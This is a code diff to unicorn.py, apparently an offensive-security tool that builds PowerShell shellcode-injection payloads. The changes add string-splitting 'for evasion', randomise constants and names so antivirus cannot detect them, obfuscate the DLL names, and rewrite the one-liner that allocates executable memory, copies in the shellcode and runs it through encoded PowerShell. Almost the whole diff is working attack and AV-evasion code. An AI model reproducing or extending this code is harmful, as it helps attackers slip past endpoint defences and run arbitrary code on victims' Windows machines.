@@ -39,6 +39,7 @@ from functools import reduce
 #        \/   \/     \/|__|             \/     \/                    \/      \/|__|   |__|   \/      ##
 #######################################################################################################
 #######################################################################################################
+
 #
 # generate a random string
 #
@@ -51,6 +52,19 @@ def generate_random_string(low, high):
 # generate a random number based on range
 def generate_random_number(low, high):
     for x in range(1): return random.randint(low,high)
+
+# randomize words for evasion
+def mangle_word(word):
+    random_length = generate_random_number(1, len(word))
+    counter = 0
+    assemble = ""
+    for letter in word:
+        if counter == random_length:
+            assemble = assemble + '"+"' + letter + '"+"' 
+        else:
+            assemble = assemble + letter
+        counter = counter + 1 
+    return assemble
 
 # needed for color in unicorn eyes
 class ColorsEnum:
@@ -491,8 +505,8 @@ def liquify_bytes(bytes, stub):
     assemble = ("$" + a1 +"=@(")
 
     # randomize numbers so av cant detect
-    b1 = generate_random_number(100,130)
-    b2 = generate_random_number(200,230)
+    b1 = generate_random_number(300,400)
+    b2 = generate_random_number(400,500)
     b3 = generate_random_number(300,330)
     b4 = generate_random_number(400,430)
     b5 = generate_random_number(500,530)
@@ -857,36 +871,89 @@ def gen_shellcode_attack(payload, ipaddr, port):
     # switch variable to be shellcode for formatting
     if ipaddr == "cobaltstrike": shellcode = payload
 
-    # added random vars before and after to change strings - AV you are
-    # seriously ridiculous.
-    var1 = "$" + generate_random_string(2, 2) # $1 
-    var2 = "$" + generate_random_string(2, 2) # $c
-    var3 = "$" + generate_random_string(2, 2) # $2
-    var4 = "$" + generate_random_string(2, 2) # $3
-    var5 = "$" + generate_random_string(2, 2) # $x
-    var6 = "$" + generate_random_string(2, 2) # $t
-    var7 = "$" + generate_random_string(2, 2) # $h
-    var8 = "$" + generate_random_string(2, 2) # $z
-    var9 = "$" + generate_random_string(2, 2) # $g
-    var10 = "$" + generate_random_string(2, 2) # $i
-    var11 = "$" + generate_random_string(2, 2) # $w
-    var12 = (str(generate_random_number(1001,1010)))
-    var13 = "$" + generate_random_string(2, 2)
+    # added random vars before and after to change strings
+    # this is a hack job but it works in checking to see if there are any variable name conflicts. While random, can happen when using only 2 randomized characters for char lenght. 
+    while True:
+        varcheck = ("")
+        reroll = False
+        var1 = "$" + generate_random_string(2, 2) # $1
+        varcheck = var1
+        var2 = "$" + generate_random_string(2, 2) # $c
+        if var2 in varcheck:
+            reroll = True
+        varcheck = varcheck + var2
+        var3 = "$" + generate_random_string(2, 2) # $2 - powershell
+        if var3 in varcheck:
+            reroll = True
+        varcheck = varcheck + var3
+        var4 = "$" + generate_random_string(2, 2) # $3
+        if var4 in varcheck:
+            reroll = True
+        varcheck = varcheck + var4
+        var5 = "$" + generate_random_string(2, 2) # $x
+        if var5 in varcheck:
+            reroll = True
+        varcheck = varcheck + var5
+        var6 = "$" + generate_random_string(2, 2) # $t
+        if var6 in varcheck:
+            reroll = True
+        varcheck = varcheck + var6
+        var7 = "$" + generate_random_string(2, 2) # $h
+        if var7 in varcheck:
+            reroll = True
+        varcheck = varcheck + var7
+        var8 = "$" + generate_random_string(2, 2) # $z
+        if var8 in varcheck:
+            reroll = True
+        varcheck = varcheck + var8
+        var9 = "$" + generate_random_string(2, 2) # $g
+        if var9 in varcheck:
+            reroll = True
+        varcheck = varcheck + var9
+        var10 = "$" + generate_random_string(2, 2) # $i
+        if var10 in varcheck:
+            reroll = True
+        varcheck = varcheck + var10
+        var11 = "$" + generate_random_string(2, 2) # $w
+        if var11 in varcheck:
+            reroll = True
+        varcheck = varcheck + var11
+        var12 = (str(generate_random_number(1001,1010)))
+        if var12 in varcheck:
+            reroll = True
+        varcheck = varcheck + var12
+        var13 = "$" + generate_random_string(2, 2) # $4 - Windows
+        if var13 in varcheck:
+            reroll = True
+        varcheck = varcheck + var13
 
-    # var 8 is our stub for byte liquify
-    shellcode = liquify_bytes(shellcode, var8)
+        # var 8 is our stub for byte liquify
+        shellcode_liquify = liquify_bytes(shellcode, var8)
+        if varcheck in shellcode: reroll=True
+
+        if reroll == True: print("[*] Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names.")
+        if reroll == False: break
+
+    shellcode = (shellcode_liquify)
 
     # generate random service name from win32 - defender was looking from name win32 + 0x00 length inside of byte array
-    randomize_service_name = generate_random_string(4,5)
+    randomize_service_name = generate_random_string(2,2)
+
+    # randomize kernel32.dll for fun
+    random_length = generate_random_number(1,12)
+
+    # randomize kernel32.dll and msvcrt.dll
+    kernel = mangle_word("kernel32.dll")
+    msv = mangle_word("msvcrt.dll")
 
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1 = '$t = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern System.Int32 CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $t -Name "%s" -namespace Win32Functions -passthru;[Byte[]]$z = %s;$g = 0x$randstack;if ($z.Length -gt 0x$randstack){$g = $z.Length};$x=$w::VirtualAlloc(0,0x$randstack,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));iex "& C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell -ec $h"''' % (randomize_service_name,shellcode))
+    powershell_code = (r'''$1='$t=''[DllImport("%s")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w=Add-Type -memberDefinition $t -Name "%s" -namespace Win32Functions -passthru;[Byte[]]$z=%s;$g=0x$randstack;if ($z.Length -gt 0x$randstack){$g=$z.Length};$x=$w::VirtualAlloc(0,0x$randstack,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;){Start-Sleep 60};';$h=[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2="powershell";$4="Windows";if([IntPtr]::Size -eq 8){$3="C:\$4\syswow64\$4$2\v1.0\$2";};iex "& $3 -e''c $h"''' % (kernel,kernel,msv,randomize_service_name,shellcode))
 
     # run it through a lame var replace
     powershell_code = powershell_code.replace("$1", var1).replace("$c", var2).replace(
         "$2", var3).replace("$3", var4).replace("$x", var5).replace("$t", var6).replace(
         "$h", var7).replace("$z", var8).replace("$g", var9).replace("$i", var10).replace(
-        "$w", var11).replace("$randstack", var12).replace("$powershell", var13)
+        "$w", var11).replace("$randstack", var12).replace("$4", var13)
 
     return powershell_code
 
@@ -1239,8 +1306,8 @@ except KeyboardInterrupt:
     print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
     sys.exit()
 
-except Exception as e:
-    if "list index" in str(e): 
-        print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
-    else:   
-        print("[!] Something went wrong, printing the error: " + str(e))
+#except Exception as e:
+#    if "list index" in str(e): 
+#        print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python unicorn.py for all usage.")
+#    else:   
+#        print("[!] Something went wrong, printing the error: " + str(e))
